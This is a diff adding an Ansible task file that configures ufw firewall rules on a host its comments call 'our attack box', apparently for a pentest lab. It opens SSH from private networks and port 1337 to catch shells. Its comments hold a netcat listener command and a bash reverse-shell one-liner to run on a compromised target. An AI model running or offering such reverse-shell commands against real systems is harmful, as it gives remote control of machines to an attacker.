@@ -1,0 +1,37 @@
+---
+- debug: msg="ufw rules for Deployer group "
+
+
+- name: Allow ssh access from RFC1918 networks to this host
+  ufw:
+    rule: allow
+    src: '{{ item }}'
+    proto: tcp
+    port: 22
+    comment: SSH to deployer from private networks
+  become: yes
+  notify: ufw_restart
+  with_items:
+    - 10.0.0.0/8
+    - 172.16.0.0/12
+    - 192.168.0.0/16
+
+
+#
+# On deployer, our attack box, listen for our shell:
+#
+# nc -lvp 1337
+#
+# On the target, where you have RCE, you can run:
+#
+# bash -i >& /dev/tcp/psi.local/1337   0>&1
+#
+- name: port to catch shells
+  ufw:
+    rule: allow
+    port: 1337
+    proto: tcp
+    src: '{{ rpi_net_id }}/{{ rpi_net_maskbit }}'
+    comment: spare port to catch shells
+  notify: ufw_restart
+  become: yes
